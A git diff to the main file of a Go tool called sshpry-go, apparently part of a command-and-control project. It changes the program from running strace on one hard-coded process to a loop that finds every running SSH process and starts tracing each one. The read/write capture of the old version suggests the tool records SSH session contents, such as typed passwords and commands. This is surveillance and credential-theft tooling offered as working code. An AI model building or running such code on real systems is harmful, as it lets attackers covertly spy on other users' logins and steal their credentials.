@@ -2,30 +2,27 @@ package main
 
 import (
 	"fmt"
+	"log"
 	"time"
 
-	"github.com/PatronC2/sshpry-go/strace"
+	"github.com/PatronC2/sshpry-go/pry"
 )
 
 func main() {
-	s := strace.STrace{
-		Flags: map[string]string{
-			"-s": "16384",
-			"-p": "1092",
-			"-e": "read,write",
-		},
-	}
-
-	s.Trace()
+	fmt.Println("Monitoring SSH processes...")
 
 	for {
-		fmt.Printf("Err: %s\n", s.Stderr.String())
-		fmt.Printf("Out: %s\n", s.Stdout.String())
+		sshPids, err := pry.GetSSHProcesses()
+		if err != nil {
+			log.Printf("Error fetching SSH processes: %v", err)
+			time.Sleep(2 * time.Second)
+			continue
+		}
 
-		s.Stderr.Reset()
-		s.Stdout.Reset()
+		for _, pid := range sshPids {
+			go pry.StartTracing(pid)
+		}
 
-		time.Sleep(1 * time.Second)
-
+		time.Sleep(2 * time.Second)
 	}
 }
